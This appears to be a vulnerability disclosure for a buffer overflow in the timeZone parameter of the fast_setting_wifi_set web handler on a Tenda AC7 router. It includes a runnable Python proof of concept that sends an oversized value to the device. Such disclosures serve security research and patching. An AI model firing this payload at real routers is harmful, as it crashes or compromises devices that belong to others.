form_fast_setting_wifi_set timeZone
---------------------------------------

### Vulnerability Details

This vulnerability lies in the `/goform/fast_setting_wifi_set` page

Tengda AC7 V1.0 V15.03.06.44 found a buffer overflow caused by the timeZone parameter in the form\_fast\_setting\_wifi\_set function, which can cause RCE:

![](api/attachments/eRMd0alKhbE6/image/image.png)

### poc

```text-plain
import requests

url = "http://192.168.142.100/goform/fast_setting_wifi_set"
headers = {
    "Host": "192.168.142.100",
    "Content-Length": "1391",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "http://192.168.142.100",
    "Referer": "http://192.168.142.100/parental_control.html?random=0.7058891673130268&",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close",
    "Cookie": "password=iqb1qw; bLanguage=cn"
}


long_part = "Raining101" * 0x100
timeZone_value = f"{long_part}:{long_part}"  

data = {
    "ssid": "1",
    "timeZone": timeZone_value
}

response = requests.post(url, headers=headers, data=data)
print(f"Status Code: {response.status_code}")
print(f"Response Text: {response.text}")
```

![](api/attachments/NFQh0mJKC3Fk/image/image.png)
